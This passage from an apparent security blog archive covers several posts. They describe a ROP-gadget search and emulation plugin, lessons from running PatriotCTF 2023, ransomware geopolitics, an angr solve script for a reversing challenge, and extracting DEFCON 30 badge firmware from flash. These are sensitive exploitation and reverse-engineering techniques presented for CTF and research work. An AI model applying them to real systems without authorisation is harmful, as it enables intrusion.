no longer existing or a multi-branch. This algorithm also utilizes the BinaryView’s session data to cache all gadgets, which GadgetSearch will use in the future to resolve gadgets instead of searching again (unless an option change violates the accuracy of the current gadget pool and a flush is required). Below is a pseudo snippet of the code responsible: # Ctrl is an architecture-tied constant in the following structure: # (start constant, inst_len, inst regex, inst_type) # ie: (b'\\xff',2,b'\\xff[\\x10\\x11\\x12\\x13\\x16\\x17]','call') for \"call [reg]\" control instruction for ctrl in self.__control_insn: # Start search at base each time curr_site = self.__bv.start while curr_site is not None: # Find potential gadget site curr_site = self.__bv.find_next_data(curr_site, ctrl[0]) if curr_site is None: break # Saved to find next search site after depth search save = curr_site # Confirm gadget site using regex match if re.match(ctrl[2], self.__bv.read(curr_site, ctrl[1])) is not None: # Depth search for gadgets and subgadgets for i in range(0, self.depth): if not self.__bv.get_segment_at(curr_site).executable: break else: curr_site = save - i check_for_insn = self.__bv.read(curr_site, i + ctrl[1]) ''' Checks for gadget violators ''' add_to_pool() cache() # Next address to continue search from curr_site = save + 1 return True Essentially: find all gadget sites using regex matching, count backwards, and add the gadget to the pool if no violations occur. It really is that simple! Gadget Analyzer The most attractive feature of this tool, which also acts as the backbone behind semantic searching, is the gadget analyzer. In abstract, the gadget analyzer works by creating a small, contextualized Unicorn emulation for the gadget, hooking instruction steps and CPU exceptions, and handling errors as they come. The method chosen of “dealing with bad things as bad things happen” was purposeful in order to keep emulations as small as possible and as fast as possible. Essentially, more stuff is added to the emulation only if it is needed and since we are dealing with a small amount of instructions and many emulations can be initialized at a time via selection scrolling, this seems like the smartest solution to a stupid problem. Step 1: Initialization First initialization occurs. During this phase an emulation context for the passed gadget is created. This is a “partial” context, as context building may be applied during the emulation depending on the gadget. This includes setting up registers according to the prestate configuration, creating a small code section for the gadget and creating a stack, which notably contains cyclic data. The reasoning behind this is so that it is easier to tell during analysis if a register is corrupted with stack data and derive the offset of controlled corruption using cyclic pattern matching. It is also useful for detecting corruption in general and recovering using the last, non-cyclic value. After configuring registers, mappings, setting the permissions of and writing the latter segments, and adding unicorn hooks, the emulation is ready. Note that the hooks are the most important aspect of this analysis framework. They let us do analysis, harness CPU violations, and allow for contextualizing the memory state in realtime. There are three hooks: Code hook — executes after the current instruction is fetched and before it is executed Memory violation hook — executes when unmapped memory is fetched Interrupt hook — executes when a CPU interruption has occurred (simply aborts) Step 2: Emulation and Realtime Contextualizing Now that the partial gadget context is created and exceptions have been harnessed, emulation is ready to begin. One of the reasons Unicorn was chosen over other emulation frameworks is because it is lightweight and contextless. This gives us the benefit of being able to create lightweight emulations with a small amount of memory mappings. However, this also means that we are unable to emulate interrupts and syscalls and that gadget execution sometimes does not accurately reflect the true binary context. For example, consider the following gadget: mov [r14], r15 ; ret ; This gadget moves the value of r15 into the dereferenced location of r14. There are two issues here, one of which we can handle gracefully. Issue A: r14 could point to memory that is statically mapped into the binary (e.g., .text, .data, .got, etc.) of which we could resolve. Issue B: Alternatively, r14 could point to memory that is dynamic, randomly based with ASLR and purely dependent on runtime context. The first situation we can handle in a gracefully stupid way. The second is a little harder and is not supported at this time, however I plan to allow corefile imports in the future, which will handle this scenario. In either case, both of these scenarios would result in failure as the CPU tries to fetch unmapped memory. This is where the memory violation hook comes into play. One of the steps that occurs before emulation actually starts, but as a part of the emulation function, is a check in a queue of mappings. If this list contains any mapping, it is resolved using helper functions and then dequeued. This is done by resolving the nearest page-aligned boundary that overlaps the target address. Then emulation will continue. The memory hook simply catches fetch violations, analyzes the dereferenced area by comparing it to mapped memory in the binary and sets an error code (which can be recoverable or non-recoverable). If the situation is recoverable via resolving then the mapping is enqueued. If the situation is not recoverable, -1 is inserted at index 0, which will direct the emulation handler to stop execution and generate an error description. Some examples of errors that are not recoverable are trying to execute mapped, non-executable memory or a null dereference. From this point on, in both cases, emulation is stopped and the handler is recursively called. The emulation handler also deals with side cases, like stack pivots, before recursion so that emulation can continue properly. Step 3: Step-thru Analysis The code hook is responsible for doing analysis and diffing at each execution cycle. This hook is after the next instruction is fetched, but before it executes. It is responsible for both saving various components of the current memory state (in case weird corruption occurs we can recover using these components) and saving analysis. Analysis information is saved in a list, where every index corresponds to the index of an instruction in a gadget and each element represents a dictionary of the memory state at that time of execution. For example: Gadget: pop rdi ; mov rsi, 0x3 ; ret ; Analysis: [{rdi:'Full control'}, {rsi:3}] The end state (used for both display and semantic queries) is simply derived from analysis_steps[-1]. Additionally, the saved previous program state is used for register diffing next time the step hook is called. At any point during emulation when the code hook is called there will exist a last_program_state that the current context will reference for recovery options and diffing. Semantic Search Filters The search filter is unique to other tools, not just for its semantic searching capabilities, but for its handling and logical parsing of queries in general. The gadget pool DataFrame is derived from the gadget pool cache, which is stored in the session. The pool contains all gadgets (including duplicates), regardless of options. Options constrain what is displayed via GadgetRender and do not actually affect the gadget cache. The gadget pool DataFrame, like the cache, will contain every gadget found. Primary queryable columns: Address (unsigned long) Bytes (string) Disasm (string) inst_cnt (int64) All registers (each an unsigned long) Semantic querying is done in three steps: Query translation DataFrame transformation DataFrame querying Example translation: Semantic search value: rax&gt;0x3b Translation: ((rax&gt;0x3b or (rax==CONTROL_SENTINEL)) and not rax==UNINITIALIZED_SENTINEL) The control sentinel value represents a register which analysis determines we have full control of (such as a popped register). We’d want to include these in the search results, since we can use these to make a register equal any value and thus it would always match any query. Additionally, we exclude the uninitialized sentinel because this sentinel value also represents unclobbered registers. After the query is built, we transform a subsection of the DataFrame by resolving analysis states from addresses in a sub-frame to the main frame until the semantic depth limit is reached. Presets are translated into static queries or queries tied to specific architecture constants. Closing That’s my tool! I hope you enjoyed this technical post describing it, which I believe was well worth writing considering the interesting algorithms and techniques that this tool adapts to do what it does. Although in retrospect, my code is not the cleanest or most optimized, I believe it is optimized enough and that some novel techniques are utilized to make it run fast with accurate results. Furthermore, this tool is an open-source plugin, so if you’d like to add a component, feature or modify existing structures, I encourage you to make a PR! I plan to actively maintain this project in the foreseeable future; specific developments I have planned can be found on the repo, but updates might be far between because of other priorities. If you’ve enjoyed this post please share it with your pwn-pals and do let me know if you’re enjoying the tool. Thank you!" }, { "title": "Running a CTF that Outlasts a Bag of Popcorn", "url": "/posts/running-a-ctf-wo-lifesupport/", "categories": "Infrastructure, CTF", "tags": "infrastructure, aws, docker, CTF", "date": "2023-09-11 00:00:00 -0400", "content": "My tales and experiences from running PatriotCTF 2023. Table of contents Foreword Hack-proof Hacking Challenges Intended Unintendeds The Final Hour Postface Foreword Running a CTF is hard. Very hard. It involves a lot of moving parts and interacting with technology in a way that is considerate and thorough, even if you are not familiar with it. A lot can go wrong at every step — and frequently, a lot does. In acknowledgment of this, I decided to upload this post to make sure that future organizers of PatriotCTF (and their successors) have a reference for the issues their not-so-distant ancestors encountered. For context, last weekend was Mason Competitive Cyber’s annual capture-the-flag competition, PatriotCTF, and it was our turn to run it. Prior to this event, no one on the active exec board had substantial experience with infrastructure or sysops. Considering this, the event ran extremely well with very few hiccups. PatriotCTF was hosted on AWS using CTFd. Our infrastructure was staged on two servers — one hosting the main CTFd instance and another hosting challenge remotes (c6a.2xlarge). Cloudflare was used for reverse proxying and providing subdomains for challenge remotes. We also had help from a very talented alumni, Christopher Roberts, who came in clutch with two awesome VM reversing challenges and an ARM pwn. Hack-proof Hacking Challenges All remotes were containerized using Docker. For the pwn challenges, we used redpwn/jail, and for other remotes, we mostly relied on xinetd. Redpwn/jail is an nsjail-based Docker image for pwnables, providing isolated, forked, and highly configurable containers. The challenge binary is mounted into /srv/app/run, which is executed inside the jail. Each connection runs in its own forked process that terminates upon disconnection. Best practice is to pull from a real OS image (e.g., Ubuntu) and copy it into the root directory since the base redpwn image is minimal. Redpwn also allows jail configuration through environment variables. For instance, JAIL_TIME can limit session timeouts, and JAIL_CONNS_PER_IP restricts connections per IP. Here’s an example Dockerfile from the bookshelfv2 challenge: FROM pwn.red/jail ENV JAIL_TIME=60 ENV JAIL_CONNS_PER_IP=10 ENV JAIL_PORT=8989 ENV JAIL_SYSCALLS=accept,accept4,... COPY --from=ubuntu / /srv COPY bookshelf /srv/app/run COPY flag.txt /srv/app/flag.txt It really is as simple as that. More examples can be found in the PatriotCTF 2023 challenge repository. Intended Unintendeds All challenges should be extensively tested — especially the hard ones. A single unintended solution can compromise the integrity of the entire scoring system. Organizers should ensure that someone other than the challenge author blind-solves hard challenges in a testing environment. They are more likely to find unintendeds than the author, who knows the intended path. An unintended solution isn’t always catastrophic unless it’s significantly easier than the intended path. For example, my hard heap grooming challenge, Softshell, was intended to transform an arbitrary free into an arbitrary write. The arbitrary free resulted from a subtle difference between how the program calculated a command list versus its size. Because the program freed memory based on argslen (which could exceed the actual list size), we ended up with an arbitrary free. The intended exploit required grooming the heap, creating a UAF on a future command’s tag list, and using the edit-tag command to get a write-what-where primitive. However, an unintended UAF in command arguments let players bypass this complexity entirely. This made a supposedly “insane”-rated challenge unexpectedly solvable by many. Luckily, some competitors still solved it the intended way — a great writeup is available here. The Final Hour It’s Friday afternoon — everything’s running smoothly until 45 minutes before the competition begins. Suddenly, this happens: The number one rule for hosting a CTF: If nothing seems wrong, it just means you don’t know what’s wrong yet. Something will go wrong. There are simply too many moving parts to account for everything. Instead of expecting perfection, the best approach is to plan for failure — fix what you can and have mitigation strategies ready. Thankfully, this particular issue was resolved with a simple fix — a quick value edit in the live CTFd SQL database. Later, we faced downtime on the challenge server. All challenge remotes were containerized on the same machine, which eventually crashed due to a memory leak in the ML PyJail challenge. The server went down during day two at 4 A.M., but our president was awake and managed to diagnose and restart it within 15 minutes. While the downtime was minimal, the ticket system exploded with caffeine-fueled complaints. In hindsight, we could’ve prevented this entirely by setting Docker memory caps or isolating high-load challenges onto separate servers. Postface Hopefully, this gives insight into what goes into hosting a CTF and the unexpected challenges that can arise. Hosting a CTF is fun, rewarding, and a great way to give back to the security community. There’s nothing like watching people solve challenges you built — sometimes even in ways you didn’t expect. If you’re considering organizing one: just do it. The experience is invaluable. Learn from our mistakes, plan for chaos, and you’ll have fewer things to worry about when the popcorn burns. See you all next year for PatriotCTF 2024." }, { "title": "International Implications of Ransomware for Dummies", "url": "/posts/ransomware-and-geopolitics-for-dummies/", "categories": "Non-technical", "tags": "non-technical", "date": "2023-04-25 00:00:00 -0400", "content": "Modern ransomware attacks often greatly affect civilian life and government operations — it is a geopolitical issue. Fuel holding tanks are seen at Colonial Pipeline’s Linden Junction Tank Farm on May 10 in Woodbridge, N.J. | Michael M. Santiago/Getty Images The Rise of Digital Chaos In 2017, a powerful cyber weapon disrupted “Constitution Day”, a holiday in Ukraine which celebrates the country’s adoption of an independent constitution. Under the noise of fireworks, a silent worm spread across computer systems disabling radiation safety systems at the Chernobyl site, shutting down banks and ATMs, disrupting businesses, maiming the Ukrainian electrical power grid and metro networks. Operators watched helplessly as a skull illuminated their screens, notifying them that their hard drives had been encrypted and demanding a ransom. The scenario seemed familiar — and it was. The attack mimicked a known ransomware strain, Petya. But this was NotPetya. Unlike typical ransomware, NotPetya was not financially motivated. Its encryption algorithm had been altered to make decryption impossible. Later forensic research strongly suggested that it was developed and deployed by Russian intelligence services. Despite the wealth of digital evidence, Russia faced little tangible consequence due to the difficulty of attribution in cyberspace. Criminal Enterprises and Safe Havens Criminal ransomware operators have exploited this ambiguity. Many operate safely within Russia’s borders under an unspoken “safe-harbor” understanding — they may attack globally, but never domestically. Although Western law enforcement has indicted numerous Russian cybercriminals, few ever see trial. Ransomware has become one of the most lucrative criminal enterprises in modern history. Its targets — critical infrastructure, corporations, and healthcare systems — have ripple effects that touch millions of civilians. As nations digitize their essential operations, ransomware has transitioned from a criminal nuisance to a geopolitical weapon. The International Policy Problem Governments struggle to respond effectively. Ransomware crosses borders and jurisdictions, leaving victims without clear avenues for recourse. Most states resort to issuing indictments or sanctions, symbolic gestures that rarely result in arrests. This underscores the need for international policy coordination — frameworks for attribution, response, and deterrence. Civilian and Economic Impacts Ransomware at this scale has two broad categories of impact: Economic Disruption (Type I): Attacks on private industries that cascade through the supply chain — e.g., the Cognizant incident. Critical Infrastructure Disruption (Type II): Attacks that directly affect civilian safety or essential services — e.g., the Colonial Pipeline incident. Large-scale attacks can shake economies and endanger lives. According to Sophos, 42% of organizations with over 1,000 employees experienced ransomware incidents. Cybercrime Magazine projects global ransomware damages will reach $265 billion annually by 2031, with a new attack every two seconds. National Security and the Cyber Front Attacks like WannaCry’s impact on the NHS highlight that ransomware is not just an IT problem — it is a homeland security issue. The FBI has warned that such attacks “can impact the physical safety of American citizens.” In response, the U.S. established the Cybersecurity and Infrastructure Security Agency (CISA) in 2018. CISA now coordinates national response efforts and operates StopRansomware.gov, underscoring how ransomware has become a threat to national and international stability. Ransomware and Geopolitics The U.S. Treasury notes that ransomware payments can “undermine U.S. foreign policy and national security interests.” BBC analysis found that 74% of ransomware profits in 2021 went to Russia-linked actors. Some groups, such as Conti and Trickbot, have expressed explicit support for Russia’s invasion of Ukraine — blurring the line between cybercrime and state action. Reports from Bellingcat and the U.S. Treasury suggest that these groups may have direct ties to Russian intelligence, particularly the FSB. Whether or not these connections are formalized, the effect is clear: ransomware has become an instrument of state power cloaked in criminal anonymity. Law, Attribution, and Due Diligence International law still lags behind cyber realities. Article 2(4) of the U.N. Charter prohibits the use of force against another state, but cyber operations rarely meet its threshold. Similarly, the principle of due diligence — a state’s obligation not to allow its territory to be used for harm — is regularly flouted by Russia’s permissive stance toward cybercriminals. Without stronger international consensus, ransomware will continue to exploit the gaps in digital governance and international law. Conclusion Ransomware has evolved from an online extortion scheme into a geopolitical force capable of influencing economies, national security, and international relations. Combating it requires more than firewalls and patches — it demands international cooperation, diplomatic pressure, and legal modernization. Only when the world begins defining the rules of cyberspace and coordinating cross-border policy will we begin to curb the global ransomware epidemic." }, { "title": "Feed the Magical Goat (Battelle)", "url": "/posts/battelle-magical-goat/", "categories": "CTF", "tags": "angr, reversing, CTF, file-sim", "date": "2023-03-23 00:00:00 -0400", "content": "Reversing challenge from Battelle showcasing angr’s file simulation feature! Table of contents Reversing Angr Solve Part 1: Reversing The following is a writeup for a reverse engineering challenge made by Battelle as one of their cyber career challenges. This challenge explores the use of angr and its ability to emulate file systems for the use of symbolic data. If you are unfamiliar with Angr and the concept of symbolic execution, I made a YouTube video exploring and explaining this which I (obviously) highly recommend you watch. A zip file containing a 32-bit, unstripped ELF is provided as part of the challenge. Running the binary outputs a bunch of text and then ends with the binary deleting itself. Starting a Binja project and looking through the strings reveals the following: File operations A filename A flag format string (Character by character, flag is likely calculated within the binary) Viewing main, a function is called which interacts with what is likely the expected file called give_offering. The function first opens chow.down and assigns the stream to eax. The following conditional checks if the operation was not successful via checking the file descriptor in eax. If it wasn’t, the program closes the file descriptor, unlinks the binary (deletes it), prints the outro and calls exit. From here on I will refer to this blob as the fail block. Assuming this conditional was false, the file is allocated onto the heap at eax_2. The next conditional checks if eax_2 is 0x40; if true a hint is printed, both the elf and chow.down are deleted and the chunk is freed, followed by a fail block. The next conditional returns the pointer to the file contents and is the path I have to follow in order to continue program execution. It checks if more than 0xf bytes were read. Returning to main, multiple conditions are checked against various offsets of the file content. If code execution continues without a conditional being true, the flag is printed using these file content offsets, of which I assume were operated on by the functions in the conditions. Looking at just one of the functions reveals that it is quite complicated. Manually reversing these functions would be significantly detrimental to my mental health, so instead I’ll use symbolic execution to find an execution path that leads to the flag print and what the file contents need to be in order for this path to execute. Angr is a symbolic execution engine for Python that utilizes Microsoft’s SMT solver Z3 and a simulation manager to manage execution states. It is also capable of file system emulation. Using this feature will be simpler than alternative methods of symbol placement, such as directly injecting into memory. Part 2: I’m Angry FS The following is my solve script: import angr,claripy,sys p = angr.Project(\"./billygoat\") s = p.factory.blank_state(addr=0x8048f46) symbol = claripy.BVS('file',8*0xf) f = angr.storage.SimFile(\"chow.down\", content=symbol) s.fs.insert(\"chow.down\",f) def win(state): # Check stdout for \"flag{\" and print flag out = str(state.posix.dumps(sys.stdout.fileno())) if \"flag{\" in out: print(\"Flag: flag\"+out.split(\"flag\")[1][:-3]) return \"flag{\" in out simgr = p.factory.simulation_manager(s) simgr.explore(find=win, avoid=0x80490ce) print(b\"Input: \"+simgr.found[0].posix.closed_fds[0][1].concretize()) Let’s step through it to understand it better. The first few lines create the Angr project, create the initial state which starts in give_offering (0x8048f46) and creates a symbol whose size is based on the constraint within that function. p = angr.Project(\"./billygoat\") s = p.factory.blank_state(addr=0x8048f46) symbol = claripy.BVS('file',8*0xf) Next a SimFile object is created with the name chow.down and whose content is the symbolic data. It is then inserted into the simulated file system. f = angr.storage.SimFile(\"chow.down\", content=symbol) s.fs.insert(\"chow.down\",f) Moving on, a function to check for a valid state is created. It checks for the substring flag{ in the stdout and prints it. Then the simulation manager is created and explored with find set to this function and avoid set to the fail block. def win(state): # Check stdout for \"flag{\" and print flag out = str(state.posix.dumps(sys.stdout.fileno())) if \"flag{\" in out: print(\"Flag: flag\"+out.split(\"flag\")[1][:-3]) return \"flag{\" in out simgr = p.factory.simulation_manager(s) simgr.explore(find=win, avoid=0x80490ce) The last line is interesting and I initially had to get help with this as Angr has some issues with managing file descriptors. Essentially its purpose is to print out the symbolic content of the file that led to the success block. print(b\"Input: \"+simgr.found[0].posix.closed_fds[0][1].concretize()) Looking at the source of Angr’s posix plugin can help clarify this line a bit better. A deep copy of the SimState is created and the closed_fds copy is a list of the super object’s closed_fds, which is also a list. This line accesses the right file descriptor and patches the input together using concretize. With that, the challenge is solved." }, { "title": "Cracking the DEFCON 30 Badge Firmware", "url": "/posts/Cracking-the-Defcon-30-Badge-Firmware/", "categories": "CTF, Embedded", "tags": "firmware rev, chip extraction, badge", "date": "2022-11-22 00:00:00 -0500", "content": "Extracting and reversing the firmware of the DC30 badge to beat the badge challenge! Table of contents Backstory Firmware Extraction Analysis and Finding Check Mapping and Decoding Backstory and Objective Once upon a time I was very excited to fly to Las Vegas and attend DEFCON 30 the annual go-to security conference. This was going to be my first conference and I had purchased pre-registration tickets, which was a new system that DEFCON was using to allow attendees to guarantee a badge and semi-skip LINECON. However, because of a personal emergency that appeared last minute, I was unable to attend and I gifted my pre-registration to my good friend and mentor playoff-rondo. Later on when I was catching up with him he gave me his badge. DEFCON badges usually have some sort of challenge on them and this year’s badge was some sort of piano keyboard. This is the writeup made by the attendee that solved the badge challenge and won a black badge, as you can see it is meant to be solved in part by interacting with other attendees who have a different variant of the badge. This is obviously not possible for me, so my goal was to reverse engineer the badge and find what key combo needs to be pressed in order to win the first part of the challenge. Part 1: Extracting Firmware from SPI Flash I began by using a magnifying glass, pen and paper to identify all the visible chips on the PCB. The two important chips to note are the Winbond W25Q16JV (flash chip) and the RP2 B2 (microcontroller). The flash memory chip will be used to grab the firmware and will be the target chip to physically extract. The microcontroller will be used to determine the architecture, conventions and other information that will be useful when analyzing the firmware. There are tools available to extract firmware from a surface-mounted chip without having to actually remove the component, however I will be using a TL866II+ universal programmer, so I will have to remove the chip from the PCB, feed the chip to the device using the appropriate adapter and connect the programmer to my VM for extraction. A heat gun would be ideal for removing a small surface mounted chip like this without damaging the PCB, however I do not have access to such equipment, so I use a soldering iron and tweezers. I heat up each joint of the chip with the iron and lift the leg up with tweezers and a magnifying glass. After I have detached the chip from the board, I go around with the iron again and a desoldering pump in an attempt to clean up as much excess solder as possible from each leg. Then I lock the flash chip in the corresponding adapter and insert it into the TL866II+. Unfortunately, the whole ordeal was pretty messy and resulted in a bit of copper from the PCB being destroyed (as is natural for my first chip-off extraction). In my ubuntu machine I use the minipro program to interact with the chip programmer. The following command writes the firmware to a file. minipro -p \"W25Q16JV@SOIC8\" -r flash.bin I can verify that this is the firmware by running strings and examining the output. Part 2: Analyzing Firmware and Finding the Comparison Function The MCU is a rpi2040 which makes use of the “execute in place” feature. This is a feature that improves performance by enabling execution directly in flash storage rather than execution in the MCU’s limited memory area. It is important that we keep this in mind before starting to analyze the firmware. Firmware has no entry point and instead has a defined address at which program execution begins. We can find this base address by viewing the rpi2040 datasheet and navigating to the “Address Map” page from the table of contents. The base address will be the XIP address (execute in place). We need to specify this address as the base address in whatever we use to analyze the firmware to load the correct segment. Using Binaryninja I can specify the base address when creating a new project. Binja automatically detects the thumb2 ARM architecture. I start to try and identify useful symbols and organize the code by searching through strings and going to their code references. Some areas have been incorrectly loaded as symbols so I undefine them. I also rename symbols that have obvious functions for clarity. Identifying and following the code reference of the interesting string, “YOU DID IT!” leads to what seems to be the function that is called when a correct key combination is entered. The only code reference leads to the following function. The first thing I noted when initially examining it was the comparison inside the loop to 0x2d. This conditional is equal to if(r3_1 == 0x2d(which is 46)) since the if-statement ends in a break. Examining the note count on my own badge and noting the number of badges with different variations, we know the total number of piano keys that make-up the passing combo is 46, since all badge’s music sheets will be used. The decompilation process complicated this loop a bit, so for sanity’s sake lets simplify it a bit in our heads. The while loop iterates over the length of the correct combo, once it reaches 46 (the length of the combo) it succeeds. The second if-statement is most important, it compares every key (it gets the key by referencing the location of the key presses in memory with the offset of the current index) with the given character at string[index] if it is not equal, it breaks ending the while loop early and never reaching the success block, else it increments combo_length. So the string in the second conditional is what we need to pay attention too. C@&gt;&lt;&gt;@C@&gt;&lt;&gt;@C@CE@EC@&gt;&lt;C@&gt;&lt;&gt;@C@&gt;&lt;&gt;@&gt;@C@CE@EGDB@ Since each key press is being compared with this string, it is safe to assume that each character in this string is mapped to a physical key on the badge. We should find another function which identifies this mapping. This would likely be the keypress code blobs directly. Some things to note before continuing: User key buffer stored @ 0x2000xxxx (keypresses). The checkwin function will likely be called every time a key is pressed, to check if the newly modified buffer is a win. Part 3: Finding the Mapping and Decoding the Key Combo checkwin has a lot of code references. Each call is likely in a blob for a key press. I’ll pin the references window and tag them all to keep everything organized and visible on the pane. Examining the very first reference we can take note that a pointer is being passed as the argument. The value at this pointer is being assigned above. For this instance that value is 0x3c, whose ascii representation is “&lt;”. Each blob that assigns a mapping is sequential in the code block, so I can safely assume that these are the keyboard mappings assigned in the order as they appear on the physical keyboard. Proceeding to the next checkwin call will reveal the mapping for the C# key (the little black key) which comes next. Proceeding through every checkwin call will reveal the character mappings for the entire keyboard. Hurray! With these mappings we can decipher the string compared in the checkwin function to the equivalent keys on the keyboard. key_map = {\"&lt;\":\"C\",\"=\":\"C#\",\"&gt;\":\"D\",\"?\":\"D#\",\"@\":\"E\",\"A\":\"F\", \"B\":\"F#\",\"C\":\"G\",\"D\":\"G#\",\"E\":\"A\",\"F\":\"A#\",\"G\":\"B\"} key_combo = \"\" for c in \"C@&gt;&lt;&gt;@C@&gt;&lt;&gt;@C@CE@EC@&gt;&lt;C@&gt;&lt;&gt;@C@&gt;&lt;&gt;@&gt;@C@CE@EGDB@\": key_combo += key_map.get(c)+\" \" print(key_combo) The following is the correct key-combination/tune we need to play on the badge keyboard in order to pass the first challenge. G E D C D E G E D C D E G E G A E A G E D C G E D C D E G E D C D E D E G E G A E A B G# F# E Sources https://www.winbond.com/hq/support/documentation/levelOne.jsp?__locale=en&amp;DocNo=DA00-W25Q16JV.1 https://datasheets.raspberrypi.com/rp2040/rp2040-datasheet.pdf" } ]
